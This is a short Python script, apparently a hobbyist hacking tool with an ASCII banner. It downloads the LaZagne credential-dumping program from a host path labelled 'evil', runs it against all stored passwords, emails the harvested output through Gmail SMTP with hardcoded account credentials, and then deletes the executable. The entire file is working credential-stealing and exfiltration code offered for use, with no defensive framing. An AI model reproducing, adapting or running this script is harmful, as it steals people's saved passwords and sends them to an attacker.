#!/usr/bin/env python

import requests
import subprocess
import re
import smtplib
import os
import tempfile



print ("""
     ____    _   _      _      ____    ____    _   _   _   _  
    |  _ \  | | | |    / \    |  _ \  / ___|  | | | | | \ | | 
    | | | | | |_| |   / _ \   | |_) | \___ \  | | | | |  \| | 
    | |_| | |  _  |  / ___ \  |  _ <   ___) | | |_| | | |\  | 
    |____/  |_| |_| /_/   \_\ |_| \_\ |____/   \___/  |_| \_| 
    
    
    
                                  ______   
	                       .-        -. 
	                      /            \         
	                     |,  .-.  .-.  ,|      
	                     | )(_ /  \_ )( |
	                     |/     /\     \|    
	           (@_       <__    ^^    __>        
	      _     ) \_______\__|IIIIII|__/____________________/\ 
	     (_)\@8@8{}<_________________________________________/ 
	            )_/         \ IIIIII /                    
	           (@            --------                      
		  \n\n""")


def download():
    temp_directory = tempfile.gettempdir()
    os.chdir(temp_directory)
    url = "http://192.168.0.198/evil/lazagne.exe"
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb")as out_file:
        out_file.write(get_response.content)

def cmd():
    command = "lazagne.exe all"
    result = subprocess.check_output(command, shell=True)
    return result



def send_mail():
    result = cmd()
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login("authenticationprocess14@gmail.com", "adminsecurity123")
    message = result
    s.sendmail("authenticationprocess14@gmail.com", "ddrish43@gmail.com", message)
    s.quit()
    os.remove("lazagne.exe")



download()
send_mail()
